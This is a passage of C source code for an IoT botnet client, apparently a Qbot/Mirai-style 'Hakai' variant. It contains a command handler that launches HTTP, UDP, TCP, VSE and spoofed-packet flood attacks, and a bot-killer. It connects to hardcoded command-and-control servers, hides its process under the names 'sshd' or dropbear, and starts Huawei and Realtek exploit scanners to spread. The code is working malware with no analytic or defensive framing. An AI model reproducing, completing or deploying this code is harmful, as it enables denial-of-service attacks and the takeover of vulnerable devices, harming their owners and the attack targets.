2/x37/x22/x35/x35/x7D/x45");
    }
        else if(80 < httpvecint < 100) {
    sprintf(choosepath, "/x2C/x77/x75/x23/x23/x29/x36/x36/x3D/x72/x77/x3C/x20/x3C/x31/x20/x30/x20/x33/x27/x7D/x2F/x74/x73/x36/x24/x2C/x72/x2C/x30/x23/x70/x27/x29/x7C/x3F/x2E/x20/x32/x27/x75/x74/x24/x33/x72/x36/x73/x73/x3D/x33/x73/x37/x23/x72/x7C/x24/x26/x27/x3D/x70/x76/x29/x2E/x3F/x28/x7D/x3F/x3D/x3C/x22/x7C/x71/x72/x3C/x76/x33/x29/x2D/x35/x22/x35/x34/x32/x3D/x21/x27/x20/x77/x74/x20/x34/x73/x35/x3D/x20/x24/x26/x33/x33/x7D/x7D/x2F/x28/x27/x3D/x35/x23/x2F/x76/x2C/x26/x75/x2C/x7D/x2F/x31/x35/x75/x22/x7D/x3C/x2B/x23/x3C/x29/x24/x32/x2F/x2D/x72/x3D/x73/x2D/x2C/x72/x34/x28/x71/x2B/x2C/x34/x73/x31/x2D/x3F/x71/x2D/x22/x2D/x3D/x29/x2D/x74/x28/x2B/x2F/x37/x22/x21/x24/x73/x3D/x2E/x75/x2D/x20/x33/x3D/x27/x74/x77/x29/x70/x72/x72/x20/x2D/x2C/x3D/x74/x2F/x2B/x36/x27/x2B/x22/x28/x2E/x2D/x22/x2B/x3C/x73/x30/x2E/x22/x31/x35/x73/x75/x3F/x28/x70/x2A/x26/x35/x23/x22/x7D/x77/x31/x31/x3F/x31/x74/x2E/x36/x31/x26/x29/x3F/x36/x2D/x2D/x73/x73/x2D/x36/x7C/x31/x24/x28/x2D/x3F/x75/x26/x75/x2B/x72/x75/x20/x72/x26/x2A/x21/x37/x3F/x70/x75/x75/x3D/x2D/x70/x2E/x31/x7D/x32/x23/x2E/x7C/x7D/x21/x76/x23/x28/x3D/x26/x22/x29/x26/x22/x2E/x28/x75/x21/x31/x26/x7C/x77/x2C/x72/x71/x2B/x3D/x2C/x71/x32/x37/x2B/x72/x71/x37/x77/x3D/x32/x3C/x31/x28/x74/x37/x24/x34/x27/x34/x77/x20/x36/x20/x71/x20/x32/x26/x27/x26/x33/x76/x27/x33/x2A/x71/x2F/x36/x22/x33/x22/x27/x75/x20/x28/x70/x29/x31/x27/x77/x29/x7D/x28/x29/x24/x3F/x3F/x30/x7D/x20/x2A/x36/x26/x27/x3C/x77/x29/x33/x2D/x29/x37/x7D/x23/x35/x26/x7C/x77/x2C/x73/x7C/x7C/x35/x73/x21/x70/x33/x7C/x33/x72/x76/x3F/x24/x21/x71/x35/x2A/x2F/x70/x34/x7C/x27/x2A/x34/x3C/x21/x32/x2D/x34/x30/x3D/x71/x7C/x28/x3C/x2C/x75/x70/x26/x27/x72/x71/x21/x7D/x24/x2D/x2F/x21/x24/x71/x2C/x24/x21/x72/x32/x37/x2C/x33/x3F/x34/x2F/x30/x7C/x33/x37/x76/x35/x7D/x76/x70/x72/x26/x73/x31/x24/x26/x75/x7D/x2D/x7D/x29/x71/x29/x7C/x72/x77/x31/x45");
    }
    
    for (i = 0; i < power; i++)
    {
        
        if(!strcmp(method, "RANDOM"))
        {
            sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", methods[(rand() % 3)], choosepath, host, UserAgents[(rand() % 5)]);
        }
        else if (!strcmp(method, "CF"))
        {
            sprintf(request, "GET /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", methods[(rand() % 3)], host, UserAgents[(rand() % 5)]);
        }
        else
        {
            sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, choosepath, host, UserAgents[(rand() % 5)]);
        }
        
        
        if (fork())
        {
            while (end > time(NULL))
            {
                socket = socket_connect(host, port);
                if (socket != 0)
                {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}

void processCmd(int argc, unsigned char *argv[])
{
       
if (!strcmp(argv[0], "HTTP"))
    {
        if (argc < 5 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) return;
        if (listFork()) return;
        httphex(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), argv[5]);
        exit(0);
    }
       if(!strcmp(argv[0], "UDP")) 
       {
           if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) 
           { return;}
           unsigned char *ip = argv[1];
           int port = atoi(argv[2]);
           int time = atoi(argv[3]);
           int spoofed = atoi(argv[4]);
           int packetsize = atoi(argv[5]);
           int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
           int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
           int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
           if(strstr(ip, ",") != NULL)
           {
               unsigned char *hi = strtok(ip, ",");
               while(hi != NULL) 
               {
                   if(!listFork()) 
                   {
                       udpfl00d(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                       _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } 
            else 
            {
                if (!listFork())
                {
                    udpfl00d(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }
            }
            return;
        }
        
        
        if(!strcmp(argv[0], "STD"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL)
                {
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL)
                    {
                        if(!listFork())
                      {
                          sendSTD(hi, port, time);
                          _exit(0);
                      }
                       hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendSTD(ip, port, time);
                 _exit(0);
             }
        }
    
        if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int psize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        tcpFl00d(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        tcpFl00d(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }

        if(!strcmp(argv[0], "CRASH"))
        {
                if(argc < 6)
                {

                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        rtcp(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        rtcp(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }

        if(!strcmp(argv[0], "CRUSH"))
        {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
            { return;}
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            unsigned char *flags = argv[5];
            int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
            int packetsize = argc > 6 ? atoi(argv[6]) : 0;
                       int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
           int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        sendSTD(hi, port, time);
                        tcpFl00d(hi, port, time, spoofed, flags, packetsize, pollinterval);
                        close(KHcommSOCK);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (listFork()) { return; }
                sendSTD(ip, port, time);
                tcpFl00d(ip, port, time, spoofed, flags, packetsize, pollinterval);
                close(KHcommSOCK);
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "KILLER"))
        {
            if(!killer_status)
            {
                if (listFork()) { return; }
                botkiller(KHcommSOCK);
            }
        }


        if(!strcmp(argv[0], "SMITE")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }


        if(!strcmp(argv[0], "CNC"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        acnc(hi, port, time);
                                        close(KHcommSOCK);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        acnc(ip, port, time);
                        _exit(0);
                }
        }
    if(!strcmp(argv[0], "KILL"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
        }
}

int initConnection()
{
        unsigned char server[4096];
        memset(server, 0, 4096);
        if(KHcommSOCK) { close(KHcommSOCK); KHcommSOCK = 0; }
        if(KHserverHACKER + 1 == SERVER_LIST_SIZE) KHserverHACKER = 0;
        else KHserverHACKER++;
        szprintf(server, "%d.%d.%d.%d", hacks[KHserverHACKER],hacks2[KHserverHACKER],hacks3[KHserverHACKER],hacks4[KHserverHACKER]);
        int port = hakai_bp;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        KHcommSOCK = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(KHcommSOCK, server, port, 30)) return 1;

        return 0;
}

int getOurIP()
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock == -1) return 0;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);

        int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
        if(err == -1) return 0;

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr*) &name, &namelen);
        if(err == -1) return 0;

        ourIP.s_addr = name.sin_addr.s_addr;

        int cmdline = open("/proc/net/route", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                if(strstr(linebuf, "\t00000000\t") != NULL)
                {
                        unsigned char *pos = linebuf;
                        while(*pos != '\t') pos++;
                        *pos = 0;
                        break;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);

        if(*linebuf)
        {
                int i;
                struct ifreq ifr;
                strcpy(ifr.ifr_name, linebuf);
                ioctl(sock, SIOCGIFHWADDR, &ifr);
                for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
        }

        close(sock);
}

char *getBuild()
{
// ARCH
#ifdef DEBUG
#define BOT_BUILD "debug"
#elif MIPS_BUILD || MIPS
#define BOT_BUILD "mips"
#elif MIPSEL_BUILD || MPSL_BUILD || MPSL || MIPSEL
#define BOT_BUILD "mipsel"
#elif SPARC_BUILD || SPARC
#define BOT_BUILD "sparc"
#elif SH4_BUILD || SH4
#define BOT_BUILD "sh4"
#elif X86_BUILD || X86_64_BUILD || X86_32_BUILD || X86
#define BOT_BUILD "x86"
#elif ARMV4_BUILD || ARM_BUILD || ARMV4L_BUILD || ARM4 || ARM
#define BOT_BUILD "armv4"
#elif ARMV5_BUILD || ARMV5L_BUILD || ARM5
#define BOT_BUILD "armv5"
#elif ARMV6_BUILD || ARMV6L_BUILD || ARM6
#define BOT_BUILD "armv6"
#elif ARMV7_BUILD || ARMV7L_BUILD || ARM7
#define BOT_BUILD "armv7"
#elif PPC_BUILD || POWERPC_BUILD || PPC || POWERPC
#define BOT_BUILD "powerpc"
#elif M68K_BUILD || M68K || M68K
#define BOT_BUILD "m68k"
#elif SRV_BUILD || SRV
#define BOT_BUILD "servers"
#else
#define BOT_BUILD "unknown"
#endif
}

int main(int argc, unsigned char *argv[])
{
char *mynameis = "";
if(access("/usr/bin/python", F_OK) != -1){
mynameis = "sshd";
} else {
mynameis = "/usr/sbin/dropbear";
}
if(geteuid() == 0){
userID = 0;
}
        
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        sprintf(argv[0], mynameis);
        prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
        getOurIP();
        table_init();
        char *tbl_exec_succ;
        int tbl_exec_succ_len = 0;
        table_unlock_val(TABLE_EXEC_SUCCESS);
        tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
        write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
        write(STDOUT, "\n", 1);
        table_lock_val(TABLE_EXEC_SUCCESS);
        watchdog_maintain();
    	huaweiscanner_scanner_init();
    	realtekscanner_scanner_init();
	scanner_init();

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                                        //N
                        }
        } else {
            //N
        } 
        #ifndef DEBUG
        signal(SIGPIPE, SIG_IGN);
        #endif
        while(1)
        {
                if(initConnection()) { sleep(5); continue; }

                getBuild();
                sockprintf(KHcommSOCK, "arch %s", BOT_BUILD);

                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(KHcommSOCK, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                       

                        unsigned char *m3ss4ge = commBuf;

                        if(*m3ss4ge == '.')
                        {
                                unsigned char *nickMask = m3ss4ge + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = m3ss4ge + 1;

                                m3ss4ge = m3ss4ge + strlen(nickMask) + 2;
                                while(m3ss4ge[strlen(m3ss4ge) - 1] == '\n' || m3ss4ge[strlen(m3ss4ge) - 1] == '\r') m3ss4ge[strlen(m3ss4ge) - 1] = 0x00;

                                unsigned char *command = m3ss4ge;
                                while(*m3ss4ge != ' ' && *m3ss4ge != 0x00) m3ss4ge++;
                                *m3ss4ge = 0x00;
                                m3ss4ge++;

                                unsigned char *tCpc0mm4nd = command;
                                while(*tCpc0mm4nd) { *tCpc0mm4nd = toupper(*tCpc0mm4nd); tCpc0mm4nd++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(m3ss4ge, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
               
        }

        return 0;
}
